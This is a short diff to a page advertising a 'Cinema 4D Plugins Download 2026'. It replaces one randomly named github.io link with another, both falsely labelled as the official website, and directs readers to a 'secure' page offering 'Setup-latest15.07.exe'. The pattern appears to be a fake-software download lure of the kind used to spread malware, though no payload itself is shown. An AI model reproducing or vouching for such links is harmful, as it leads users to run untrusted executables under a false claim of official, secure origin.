@@ -49,7 +49,7 @@ A: The plugins require Cinema 4D R21 or later, and a system with at least 8GB of
 
 To get started with the Cinema 4D Plugins Download 2026, click the link below:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 This link will take you to a secure download page where you can access "Setup-latest15.07.exe" and other resources. If you have any questions or need support, feel free to reach out through the repository issues.
 
